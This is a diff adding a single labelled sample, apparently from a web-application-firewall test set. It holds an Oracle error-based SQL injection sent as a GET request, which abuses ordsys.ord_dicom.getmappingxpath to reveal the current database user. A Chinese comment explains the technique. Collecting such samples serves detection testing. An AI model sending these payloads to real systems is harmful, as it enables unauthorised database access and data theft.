@@ -1,0 +1,9 @@
+# SQL注入_GET_oracle_报错注入-06506309
+# 攻击者基于报错查询，将"(select ordsys.ord_dicom.getmappingxpath ((select user from dual),1,1) from  dual) is not null"语句注入到 SQL 查询参数中，利用函数ordsys.ord_dicom.getmappingxpath获取当前用户信息。
+GET /?id=1%20and%20%28select%20ordsys.ord_dicom.getmappingxpath%20%28%28select%20user%20from%20dual%29%2C1%2C1%29%20from%20%20dual%29%20is%20not%20null&bid=hd_tag_m8mv2413 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2413
+RM-PRO-Token: 58a786c492e661f754a99514c4568480
+RM-PRO-Time: 1742808357323
+User-Agent: curl/7.83.1
+
